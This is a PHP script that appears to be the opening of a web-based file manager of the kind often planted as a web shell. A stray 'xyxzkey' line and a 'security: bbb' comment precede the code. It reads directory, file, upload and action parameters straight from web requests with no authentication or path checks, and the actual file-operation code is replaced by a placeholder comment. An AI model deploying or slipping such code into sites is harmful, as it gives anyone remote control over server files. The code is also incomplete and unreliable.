xyxzkey
<?php
/* security:
bbb
 */
$lang = 'auto';

/* Charset of output:
 * possible values are described in the charset table at
 * http://www.php.net/manual/en/function.htmlentities.php
 * 'auto' - use the same charset as the words of my language are encoded
 */
$site_charset = 'auto';

/* Homedir:
 * For example: './' - the script's directory
 */
$homedir = './';

/* Size of the edit textarea
 */
$editcols = 80;
$editrows = 25;

/* -------------------------------------------
 * Optional configuration (remove # to enable)
 */

/* Permission of created directories:
 * For example: 0705 would be 'drwx---r-x'.
 */
# $dirpermission = 0705;

/* Permission of created files:
 * For example: 0604 would be '-rw----r--'.
 */
# $filepermission = 0604;

/* Filenames related to the apache web server:
 */
$htaccess = '.htaccess';
$htpasswd = '.htpasswd';

/* ------------------------------------------------------------------------- */

if (get_magic_quotes_gpc()) {
	array_walk($_GET, 'strip');
	array_walk($_POST, 'strip');
	array_walk($_REQUEST, 'strip');
}

if (array_key_exists('image', $_GET)) {
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}

if (!function_exists('lstat')) {
	function lstat ($filename) {
		return stat($filename);
	}
}

$delim = DIRECTORY_SEPARATOR;

if (function_exists('php_uname')) {
	$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
} else {
	$win = ($delim == '\\') ? true : false;
}

if (!empty($_SERVER['PATH_TRANSLATED'])) {
	$scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
} elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
	$scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
} elseif (function_exists('getcwd')) {
	$scriptdir = getcwd();
} else {
	$scriptdir = '.';
}
$homedir = relative2absolute($homedir, $scriptdir);

$dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;

if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
	$dir = relative2absolute($dir, $_POST['olddir']);
}

$directory = simplify_path(addslash($dir));

$files = array();
$action = '';
if (!empty($_POST['submit_all'])) {
	$action = $_POST['action_all'];
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
			$files[] = $_POST["file$i"];
		}
	}
} elseif (!empty($_REQUEST['action'])) {
	$action = $_REQUEST['action'];
	$files[] = relative2absolute($_REQUEST['file'], $directory);
} elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
	$files[] = $_FILES['upload'];
	$action = 'upload';
} elseif (array_key_exists('num', $_POST)) {
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("submit$i", $_POST)) break;
	}
	if ($i < $_POST['num']) {
		$action = $_POST["action$i"];
		$files[] = $_POST["file$i"];
	}
}
// ... rest of file manager functionality
?>